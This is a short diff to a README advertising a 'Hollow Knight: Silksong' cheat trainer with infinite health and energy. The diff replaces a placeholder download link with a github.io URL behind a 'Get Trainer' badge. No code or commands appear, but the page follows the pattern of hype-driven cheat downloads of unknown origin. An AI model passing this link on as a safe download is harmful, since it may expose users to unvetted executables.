@@ -4,7 +4,7 @@
 
 Silksong promises brutal combat and tight platforming — but what if you could explore freely without the grind? Our **Hollow Knight: Silksong trainer** unlocks infinite health, endless energy, and power toggles that let you focus on pure adventure. ⚔️
 
-[![Get Hollow Knight: Silksong Trainer](https://img.shields.io/badge/Get%20Hollow%20Knight%3A%20Silksong%20Trainer-blueviolet)](EXAMPLE)
+[![Get Hollow Knight: Silksong Trainer](https://img.shields.io/badge/Get%20Hollow%20Knight%3A%20Silksong%20Trainer-blueviolet)](https://hollow-knight-silksong-trainer.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
